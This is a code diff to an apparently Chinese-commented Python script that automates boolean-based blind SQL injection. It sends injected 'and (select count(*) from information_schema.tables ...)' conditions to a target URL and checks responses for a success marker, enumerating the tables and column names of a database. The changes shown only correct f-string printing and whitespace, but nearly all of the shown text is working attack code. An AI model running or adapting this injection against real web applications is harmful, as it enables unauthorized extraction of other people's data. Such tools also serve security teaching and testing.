@@ -33,7 +33,7 @@ def get_number_of_tables(database):
         resp = httpx.get(URL + f"?id=1 and (select count(*) from information_schema.tables where table_schema='{database}')={i}")
         if SUCCESS_MARK in resp.text:
             return i
-        i = i + 1
+        i = i + 1   
 
 def get_length_of_tables(database,count_of_tables):
     '''获取指定库所有表的表名长度'''
@@ -131,10 +131,10 @@ if __name__ == '__main__':
     print()
     print(f"Getting the column names in the {i} table......")
     count_of_columns = get_number_of_columns(i)
-    print("[+]There are {count_of_columns} tables in the {i} table")
+    print(f"[+]There are {count_of_columns} tables in the {i} table")
     length_list_of_columns = get_length_list_of_columns(database,i,count_of_columns)
     columns = get_columns(database,i,count_of_columns,length_list_of_columns)
-    print("[+]The column(s) name in {i} table is:{columns}")
+    print(f"[+]The column(s) name in {i} table is:{columns}")
     j = input("Select the column name:")
     if j not in columns:
         print("Error!")
